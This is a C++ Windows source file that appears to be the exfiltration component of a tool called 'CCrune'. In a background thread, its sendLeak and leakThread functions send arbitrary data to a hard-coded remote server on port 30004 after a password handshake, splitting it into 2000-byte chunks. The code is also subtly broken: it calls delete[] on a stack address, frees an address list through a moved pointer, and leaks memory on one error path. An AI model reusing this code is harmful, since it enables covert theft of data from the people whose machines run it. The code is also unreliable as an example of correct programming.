#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include "../CCruneLeak/leakCodes.h"

#pragma comment (lib, "Ws2_32.lib")

SOCKET getSocket() {
	addrinfo sockaddr;
	PADDRINFOA hostinfo = NULL;

	ZeroMemory(&sockaddr, sizeof(sockaddr));
	sockaddr.ai_family = AF_INET;
	sockaddr.ai_socktype = SOCK_STREAM;
	sockaddr.ai_protocol = IPPROTO_TCP;

	SOCKET MainSock = INVALID_SOCKET;

	if (getaddrinfo(CCRUNE_IP, "30004", &sockaddr, &hostinfo)) {
		return INVALID_SOCKET;
	}

	for (hostinfo; hostinfo != NULL; hostinfo = hostinfo->ai_next) {

		MainSock = socket(hostinfo->ai_family, hostinfo->ai_socktype, hostinfo->ai_protocol);
		if (MainSock == INVALID_SOCKET) {
			freeaddrinfo(hostinfo);
			return INVALID_SOCKET;
		}

		if (connect(MainSock, hostinfo->ai_addr, hostinfo->ai_addrlen) == SOCKET_ERROR) {
			closesocket(MainSock);
			MainSock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(hostinfo);

	if (MainSock == INVALID_SOCKET) return INVALID_SOCKET;

	UINT64 pass = CCRUNE_PASS;

	if (send(MainSock, (char*)&pass, sizeof(UINT64), 0) == SOCKET_ERROR) {
		closesocket(MainSock);
		return INVALID_SOCKET;
	}

	return MainSock;
}

DWORD WINAPI leakThread(LPVOID args) {
	WSADATA ws;
	if (WSAStartup(MAKEWORD(2, 2), &ws)) return 1;

	size_t size = *(size_t*)args;
	char* data = (char*)args + sizeof(size_t);

	SOCKET leakSocket = getSocket();
	if (leakSocket == INVALID_SOCKET) {
		WSACleanup();
		delete[] (char *)&size;
		return 1;
	}

	if (send(leakSocket, (char*)&size, sizeof(size_t), 0) == SOCKET_ERROR) {
		closesocket(leakSocket);
		WSACleanup();
		return 1;
	}

	while (size > 2000) {
		if (send(leakSocket, data, 2000, 0) == SOCKET_ERROR) {
			closesocket(leakSocket);
			WSACleanup();
			delete[](char*)& size;
			return 2;
		}
		size -= 2000;
		data += 2000;
	}

	send(leakSocket, data, size, 0);
	closesocket(leakSocket);
	WSACleanup();
	delete[] (char*)&size;

	return 0;
}

void sendLeak(char* data, size_t size) {
	char* args = new char[size + sizeof(size_t)];
	(*(size_t*)args) = size;
	memcpy(args + sizeof(size_t), data, size);

	HANDLE th = CreateThread(NULL, NULL, leakThread, args, 0, NULL);

	if (th) {
		CloseHandle(th);
	}
	else {
		delete[] args;
	}
}